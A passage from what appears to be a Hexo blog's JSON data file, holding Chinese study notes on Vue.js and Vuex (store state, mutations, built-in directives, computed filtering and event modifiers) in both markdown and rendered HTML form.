vuex<br></code></pre></td></tr></table></figure>\n\n<p>​    2.Vuex得使用</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">//main.js</span><br><span class=\"hljs-keyword\">import</span> <span class=\"hljs-title class_\">Vuex</span> <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;Vuex&#x27;</span><br><br><span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-title class_\">Vuex</span>);<br><br><span class=\"hljs-keyword\">const</span> store=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vuex</span>.<span class=\"hljs-title class_\">Store</span>(&#123;<br>      <span class=\"hljs-attr\">state</span>:&#123;<br>          <span class=\"hljs-comment\">//定义一个数据</span><br>        \t<span class=\"hljs-attr\">count</span>:<span class=\"hljs-number\">0</span><br>      &#125;<br>&#125;);<br><br><span class=\"hljs-comment\">//在任何vue文件中都可以获取该数据</span><br><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">&lt;template&gt;<br>    &lt;div&gt;<br>        //获取数据<br>          &#123;&#123; $store.state.count &#125;&#125;<br>    &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>    name:&#x27;Counter&#x27;,<br>    //使用computed方法显示<br>    computed:&#123;<br>        count()&#123;<br>            return this.$store.state.count;<br>        &#125;<br>    &#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style&gt;<br><br>&lt;/style&gt;<br></code></pre></td></tr></table></figure>\n\n<p>3.修改vuex的数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">const store=new Vuex.Store(&#123;<br>      state:&#123;<br>        count:0<br>      &#125;,<br>//首先在store中声明两个mutations<br>      mutations:&#123;<br>//increase可以再添加一个参数来控制数值改变的大小；<br>        increase(state)&#123;<br>          state.count+=1;<br>        &#125;,<br>        decrease(state)&#123;<br>          state.count-=1;<br>        &#125;<br>      &#125;<br>&#125;);<br><br><br>&lt;template&gt;<br>    &lt;div&gt;<br>        &lt;button @click=&quot;handleIncrease&quot;&gt;+1&lt;/button&gt;<br>          &#123;&#123; count &#125;&#125;<br>        &lt;button @click=&quot;handleDecrease&quot;&gt;-1&lt;/button&gt;  <br>    &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import Button from &#x27;./Button.vue&#x27;;<br>export default &#123;<br>  components: &#123; Button &#125;,<br>    name:&#x27;Counter&#x27;,<br>    computed:&#123;<br>        count()&#123;<br>            return this.$store.state.count;<br>        &#125;<br>    &#125;,<br>    //使用methods方法来调用mutations实现数据修改；<br>    methods:&#123;<br>        handleIncrease:function()&#123;<br>            this.$store.commit(&#x27;increase&#x27;);<br>        &#125;,<br>        handleDecrease:function()&#123;<br>            this.$store.commit(&#x27;decrease&#x27;);<br>        &#125;<br>    &#125;<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>\n\n<p>ES6小语法：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">//函数的参数可以设定默认值，当没有传入参数使用默认参数;一个参数不够时，可以传入一个对象，无限扩展；</span><br>increase（state，n)&#123;<br>    n=n || <span class=\"hljs-number\">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>4.高级用法</p>\n"},{"title":"Vue.js实战（3）","date":"2020-11-20T09:38:45.000Z","mp3":null,"cover":"img/bg4.jpeg","_content":"\n# Ch5 内置指令\n\n### 5.1 基本指令\n\n\n1.v-cloak\n网速较慢时，vue.js还没有加载完成，页面会显示空内容，用v-cloak解决；\n\n\n\n```html\n<div id=\"app\" cloak>\n    {{ content }}\n</div>\n\n[cloak]{\ndisplay:none;\n}\n```\n\n2.v-once\n\n仅仅渲染一次，首次渲染后，不在随数据的变化而变化，视为静态内容；\n\n3.v-if、v-else-if、v-else\n\n```html\n<div id=\"app\">\n    <a v-if=\"status===1\">显示状态1</a>\n    <a v-else-if=\"status===2\">显示状态2</a>\n    <a v-else=\"status===3\">显示状态3</a>\n    //判断多个元素，使用<template></template>\n</div>\n```\n\n一个简单的切换按钮效果\n\n```html\n   <div id=\"app\">\n        <template v-if=\"type=== 'name'\">\n            <input type=\"text\" placeholder=\"name\">\n        </template>\n\n        <template v-else>\n            <input type=\"email\" placeholder=\"xxx@xx.com\">\n        </template>\n        <button @click=\"changeMode\">切换</button>\n    </div>\n    \n    \n    <script>\n        var app=new Vue({\n            el:\"#app\",\n            data:{\n                type:'name',\n            },\n            methods:{\n                changeMode:function(){\n                    this.type=this.type==='name'?'mail':'name';\n                }\n            }\n        })\n    </script>\n```\n\n4.v-show:与if基本一致，但是不可以用在'''\\<template>\\</template>'''\n\n区别：v-if只有为true的时候才会编译渲染，而v-show只是css属性切换，一定会编译，适用于经常切换的场合；\n\n\n\n5.v-for：数组遍历及枚举\n\n```html\n <div>\n            <li v-for=\"book in books\">{{ book.name }}</li>\n        </div>\n data:{\n\t\tbooks:[\n\t{ name: '<Book1>' },\n    { name: '<Book1>' },\n    { name: '<Book1>' }, \n    ]\n    },\n```\n\n### 5.3过滤与排序：使用计算属性返回处理后的数组\n\n筛选数据：\n\n```html\n         computed:{\n                filterBooks:function(){\n                    return this.books.filter(function(book){\n                        return book.name.match(/Book2/);\n                    })\n                }\n```\n\n### 5.4 方法与事件\n\n```html\n//一个小的计数器\n <div>\n            点击次数：{{ counter }}\n            <button @click=\"counter++\">Click</button>\n            <button @click=\"add10\">Click +10</button>\n            <button @click=\"reset_counter\">Reset</button>\n        </div>\n\n<script>\n     add10:function(){\n                    this.counter+=10;\n                },\n     reset_counter:function(){\n                     this.counter=0;\n                }\n</script>\n```\n\n5.4.2 修饰符\n\n修饰符\n\n| .stop  | .prevent | .capture |\n| ------ | -------- | :------- |\n| .self  | .once    | .enter   |\n| .tab   | .delete  | .esc     |\n| .space | .up      | .down    |\n\n","source":"_posts/Vue.js实战（3）.md","raw":"---\ntitle: Vue.js实战（3）\ndate: 2020-11-20 17:38:45\ncategories: \n    - 前端\ntags: \n    - VUE\n    - 笔记\n    - Vue.js实战\nmp3: \ncover: img/bg4.jpeg\n---\n\n# Ch5 内置指令\n\n### 5.1 基本指令\n\n\n1.v-cloak\n网速较慢时，vue.js还没有加载完成，页面会显示空内容，用v-cloak解决；\n\n\n\n```html\n<div id=\"app\" cloak>\n    {{ content }}\n</div>\n\n[cloak]{\ndisplay:none;\n}\n```\n\n2.v-once\n\n仅仅渲染一次，首次渲染后，不在随数据的变化而变化，视为静态内容；\n\n3.v-if、v-else-if、v-else\n\n```html\n<div id=\"app\">\n    <a v-if=\"status===1\">显示状态1</a>\n    <a v-else-if=\"status===2\">显示状态2</a>\n    <a v-else=\"status===3\">显示状态3</a>\n    //判断多个元素，使用<template></template>\n</div>\n```\n\n一个简单的切换按钮效果\n\n```html\n   <div id=\"app\">\n        <template v-if=\"type=== 'name'\">\n            <input type=\"text\" placeholder=\"name\">\n        </template>\n\n        <template v-else>\n            <input type=\"email\" placeholder=\"xxx@xx.com\">\n        </template>\n        <button @click=\"changeMode\">切换</button>\n    </div>\n    \n    \n    <script>\n        var app=new Vue({\n            el:\"#app\",\n            data:{\n                type:'name',\n            },\n            methods:{\n                changeMode:function(){\n                    this.type=this.type==='name'?'mail':'name';\n                }\n            }\n        })\n    </script>\n```\n\n4.v-show:与if基本一致，但是不可以用在'''\\<template>\\</template>'''\n\n区别：v-if只有为true的时候才会编译渲染，而v-show只是css属性切换，一定会编译，适用于经常切换的场合；\n\n\n\n5.v-for：数组遍历及枚举\n\n```html\n <div>\n            <li v-for=\"book in books\">{{ book.name }}</li>\n        </div>\n data:{\n\t\tbooks:[\n\t{ name: '<Book1>' },\n    { name: '<Book1>' },\n    { name: '<Book1>' }, \n    ]\n    },\n```\n\n### 5.3过滤与排序：使用计算属性返回处理后的数组\n\n筛选数据：\n\n```html\n         computed:{\n                filterBooks:function(){\n                    return this.books.filter(function(book){\n                        return book.name.match(/Book2/);\n                    })\n                }\n```\n\n### 5.4 方法与事件\n\n```html\n//一个小的计数器\n <div>\n            点击次数：{{ counter }}\n            <button @click=\"counter++\">Click</button>\n            <button @click=\"add10\">Click +10</button>\n            <button @click=\"reset_counter\">Reset</button>\n        </div>\n\n<script>\n     add10:function(){\n                    this.counter+=10;\n                },\n     reset_counter:function(){\n                     this.counter=0;\n                }\n</script>\n```\n\n5.4.2 修饰符\n\n修饰符\n\n| .stop  | .prevent | .capture |\n| ------ | -------- | :------- |\n| .self  | .once    | .enter   |\n| .tab   | .delete  | .esc     |\n| .space | .up      | .down    |\n\n","slug":"Vue.js实战（3）","published":1,"updated":"2021-01-26T12:17:44.000Z","_id":"clg29vyhj003yao9cd6cxerb8","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Ch5-内置指令\"><a href=\"#Ch5-内置指令\" class=\"headerlink\" title=\"Ch5 内置指令\"></a>Ch5 内置指令</h1><h3 id=\"5-1-基本指令\"><a href=\"#5-1-基本指令\" class=\"headerlink\" title=\"5.1 基本指令\"></a>5.1 基本指令</h3><p>1.v-cloak<br>网速较慢时，vue.js还没有加载完成，页面会显示空内容，用v-cloak解决；</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span> <span class=\"hljs-attr\">cloak</span>&gt;</span><br>    &#123;&#123; content &#125;&#125;<br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br>[cloak]&#123;<br>display:none;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>2.v-once</p>\n<p>仅仅渲染一次，首次渲染后，不在随数据的变化而变化，视为静态内容；</p>\n<p>3.v-if、v-else-if、v-else</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">v-if</span>=<span class=\"hljs-string\">&quot;status===1&quot;</span>&gt;</span>显示状态1<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">v-else-if</span>=<span class=\"hljs-string\">&quot;status===2&quot;</span>&gt;</span>显示状态2<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">v-else</span>=<span class=\"hljs-string\">&quot;status===3&quot;</span>&gt;</span>显示状态3<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br>    //判断多个元素，使用<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">template</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">template</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>一个简单的切换按钮效果</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>     <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">template</span> <span class=\"hljs-attr\">v-if</span>=<span class=\"hljs-string\">&quot;type=== &#x27;name&#x27;&quot;</span>&gt;</span><br>         <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;text&quot;</span> <span class=\"hljs-attr\">placeholder</span>=<span class=\"hljs-string\">&quot;name&quot;</span>&gt;</span><br>     <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">template</span>&gt;</span><br><br>     <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">template</span> <span class=\"hljs-attr\">v-else</span>&gt;</span><br>         <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;email&quot;</span> <span class=\"hljs-attr\">placeholder</span>=<span class=\"hljs-string\">&quot;xxx@xx.com&quot;</span>&gt;</span><br>     <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">template</span>&gt;</span><br>     <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;changeMode&quot;</span>&gt;</span>切换<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br> <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br> <br> <br> <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">     <span class=\"hljs-keyword\">var</span> app=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">         <span class=\"hljs-attr\">el</span>:<span class=\"hljs-string\">&quot;#app&quot;</span>,</span><br><span class=\"language-javascript\">         <span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">             <span class=\"hljs-attr\">type</span>:<span class=\"hljs-string\">&#x27;name&#x27;</span>,</span><br><span class=\"language-javascript\">         &#125;,</span><br><span class=\"language-javascript\">         <span class=\"hljs-attr\">methods</span>:&#123;</span><br><span class=\"language-javascript\">             <span class=\"hljs-attr\">changeMode</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;</span><br><span class=\"language-javascript\">                 <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">type</span>=<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">type</span>===<span class=\"hljs-string\">&#x27;name&#x27;</span>?<span class=\"hljs-string\">&#x27;mail&#x27;</span>:<span class=\"hljs-string\">&#x27;name&#x27;</span>;</span><br><span class=\"language-javascript\">             &#125;</span><br><span class=\"language-javascript\">         &#125;</span><br><span class=\"language-javascript\">     &#125;)</span><br><span class=\"language-javascript\"> </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>4.v-show:与if基本一致，但是不可以用在’’’&lt;template&gt;&lt;/template&gt;’’’</p>\n<p>区别：v-if只有为true的时候才会编译渲染，而v-show只是css属性切换，一定会编译，适用于经常切换的场合；</p>\n<p>5.v-for：数组遍历及枚举</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><br>           <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">li</span> <span class=\"hljs-attr\">v-for</span>=<span class=\"hljs-string\">&quot;book in books&quot;</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">li</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>data:&#123;<br>\tbooks:[<br>&#123; name: &#x27;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">Book1</span>&gt;</span>&#x27; &#125;,<br>   &#123; name: &#x27;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">Book1</span>&gt;</span>&#x27; &#125;,<br>   &#123; name: &#x27;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">Book1</span>&gt;</span>&#x27; &#125;, <br>   ]<br>   &#125;,<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"5-3过滤与排序：使用计算属性返回处理后的数组\"><a href=\"#5-3过滤与排序：使用计算属性返回处理后的数组\" class=\"headerlink\" title=\"5.3过滤与排序：使用计算属性返回处理后的数组\"></a>5.3过滤与排序：使用计算属性返回处理后的数组</h3><p>筛选数据：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">computed:&#123;<br>       filterBooks:function()&#123;<br>           return this.books.filter(function(book)&#123;<br>               return book.name.match(/Book2/);<br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"5-4-方法与事件\"><a href=\"#5-4-方法与事件\" class=\"headerlink\" title=\"5.4 方法与事件\"></a>5.4 方法与事件</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">//一个小的计数器<br> <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><br>            点击次数：&#123;&#123; counter &#125;&#125;<br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;counter++&quot;</span>&gt;</span>Click<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;add10&quot;</span>&gt;</span>Click +10<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;reset_counter&quot;</span>&gt;</span>Reset<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">     <span class=\"hljs-attr\">add10</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">counter</span>+=<span class=\"hljs-number\">10</span>;</span><br><span class=\"language-javascript\">                &#125;,</span><br><span class=\"language-javascript\">     <span class=\"hljs-attr\">reset_counter</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;</span><br><span class=\"language-javascript\">                     <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">counter</span>=<span class=\"hljs-number\">0</span>;</span><br><span class=\"language-javascript\">                &#125;</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>5.4.2 修饰符</p>\n<p>修饰符</p>\n<table>\n<thead>\n<tr>\n<th>.stop</th>\n<th>.prevent</th>\n<th align=\"left\">.capture</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>.self</td>\n<td>.once</td>\n<td align=\"left\">.enter</td>\n</tr>\n<tr>\n<td>.tab</td>\n<td>.delete</td>\n<td align=\"left\">.esc</td>\n</tr>\n<tr>\n<td>.space</td>\n<td>.up</td>\n<td align=\"left\">.down</td>\n</tr>\n</tbody></table>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Ch5-内置指令\"><a href=\"#Ch5-内置指令\" class=\"headerlink\" title=\"Ch5 内置指令\"></a>Ch5 内置指令</h1><h3 id=\"5-1-基本指令\"><a href=\"#5-1-基本指令\" class=\"headerlink\" title=\"5.1 基本指令\"></a>5.1 基本指令</h3><p>1.v-cloak<br>网速较慢时，vue.js还没有加载完成，页面会显示空内容，用v-cloak解决；</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span> <span class=\"hljs-attr\">cloak</span>&gt;</span><br>    &#123;&#123; content &#125;&#125;<br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br>[cloak]&#123;<br>display:none;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>2.v-once</p>\n<p>仅仅渲染一次，首次渲染后，不在随数据的变化而变化，视为静态内容；</p>\n<p>3.v-if、v-else-if、v-else</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">v-if</span>=<span class=\"hljs-string\">&quot;status===1&quot;</span>&gt;</span>显示状态1<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">v-else-if</span>=<span class=\"hljs-string\">&quot;status===2&quot;</span>&gt;</span>显示状态2<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">v-else</span>=<span class=\"hljs-string\">&quot;status===3&quot;</span>&gt;</span>显示状态3<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br>    //判断多个元素，使用<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">template</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">template</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>一个简单的切换按钮效果</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>     <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">template</span> <span class=\"hljs-attr\">v-if</span>=<span class=\"hljs-string\">&quot;type=== &#x27;name&#x27;&quot;</span>&gt;</span><br>         <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;text&quot;</span> <span class=\"hljs-attr\">placeholder</span>=<span class=\"hljs-string\">&quot;name&quot;</span>&gt;</span><br>     <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">template</span>&gt;</span><br><br>     <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">template</span> <span class=\"hljs-attr\">v-else</span>&gt;</span><br>         <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;email&quot;</span> <span class=\"hljs-attr\">placeholder</span>=<span class=\"hljs-string\">&quot;xxx@xx.com&quot;</span>&gt;</span><br>     <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">template</span>&gt;</span><br>     <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;changeMode&quot;</span>&gt;</span>切换<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br> <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br> <br> <br> <span 